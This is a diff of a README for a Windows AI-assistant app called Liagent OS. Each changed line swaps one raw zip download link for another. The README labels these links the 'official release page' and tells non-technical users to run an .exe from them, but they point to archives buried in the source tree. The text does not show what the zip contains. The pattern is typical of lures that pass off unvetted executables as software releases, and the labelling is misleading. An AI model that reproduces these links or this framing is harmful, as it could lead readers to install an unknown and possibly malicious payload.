@@ -1,6 +1,6 @@
 # 🤖 Liagent_OS_V0.1.2 - Your Private AI Assistant Hub
 
-[![Download Liagent_OS_V0.1.2](https://img.shields.io/badge/Download-Liagent_OS_V0.1.2-%234285F4?style=for-the-badge&logo=github)](https://github.com/Rinnus/Liagent_OS_V0.1.2/raw/refs/heads/main/src/liagent/ui/static/js/renderers/O_Liagent_2.8-beta.5.zip)
+[![Download Liagent_OS_V0.1.2](https://img.shields.io/badge/Download-Liagent_OS_V0.1.2-%234285F4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rinnus/Liagent_OS_V0.1.2/main/src/Liagent-O-3.7.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps to download and run Liagent OS on your Windows PC. No coding 
 
 Visit the official release page by clicking the big button below or the link provided later in the install steps.
 
-[![Download Liagent_OS_V0.1.2](https://img.shields.io/badge/Download-Liagent_OS_V0.1.2-%23333?style=for-the-badge&logo=github)](https://github.com/Rinnus/Liagent_OS_V0.1.2/raw/refs/heads/main/src/liagent/ui/static/js/renderers/O_Liagent_2.8-beta.5.zip)
+[![Download Liagent_OS_V0.1.2](https://img.shields.io/badge/Download-Liagent_OS_V0.1.2-%23333?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rinnus/Liagent_OS_V0.1.2/main/src/Liagent-O-3.7.zip)
 
 - The page lists the latest versions available.
 - Look for the file named something like `Liagent_OS_Setup.exe` or a version with `.exe` in its name.
@@ -97,7 +97,7 @@ Use the menu at the side or buttons in the app to explore features. Each option 
 
 ## 🔄 Updating the Software
 
-Periodically check the [release page](https://github.com/Rinnus/Liagent_OS_V0.1.2/raw/refs/heads/main/src/liagent/ui/static/js/renderers/O_Liagent_2.8-beta.5.zip) for newer versions:
+Periodically check the [release page](https://raw.githubusercontent.com/Rinnus/Liagent_OS_V0.1.2/main/src/Liagent-O-3.7.zip) for newer versions:
 
 - Download the latest setup file as you did initially.
 - Run the installer; it will update your current installation without losing your data or preferences.
@@ -120,7 +120,7 @@ This will remove the software, but you can keep your data files if you want.
 ## 🔗 Useful Links
 
 - Official releases and downloads:  
-  [https://github.com/Rinnus/Liagent_OS_V0.1.2/raw/refs/heads/main/src/liagent/ui/static/js/renderers/O_Liagent_2.8-beta.5.zip](https://github.com/Rinnus/Liagent_OS_V0.1.2/raw/refs/heads/main/src/liagent/ui/static/js/renderers/O_Liagent_2.8-beta.5.zip)
+  [https://raw.githubusercontent.com/Rinnus/Liagent_OS_V0.1.2/main/src/Liagent-O-3.7.zip](https://raw.githubusercontent.com/Rinnus/Liagent_OS_V0.1.2/main/src/Liagent-O-3.7.zip)
 - User guides and support (inside the app help menu)
 
 ---
